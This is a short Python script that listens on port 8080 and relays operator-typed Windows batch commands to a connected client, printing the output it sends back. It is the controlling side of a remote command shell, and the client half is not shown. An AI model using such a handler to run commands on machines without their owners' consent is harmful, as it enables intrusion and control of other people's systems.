
import socket as sk

socket = sk.socket()
host = sk.gethostname()
port = 8080
socket.bind((host, port))  # Bind the self-host and the self-port
print("Waiting for connections")
socket.listen(1)  # Starts the search to other clients
# Accept the connection to the other client
Connection, Address = socket.accept()
print(f"{Address} has connected to the server!")  # Connect ad

while True:
    # waits a command of the host (uses windows batch commands)
    command = str(input("Command: #"))
    Connection.send(command.encode())  # sends the command
    print("Command sended!")
    Return = Connection.recv(1024)  # Returns de output of the other client.

    if Return:  # Checks if there's a return
        print(Return.decode())  # Prints the output
    else:  # If theres no return
        print("No data!")
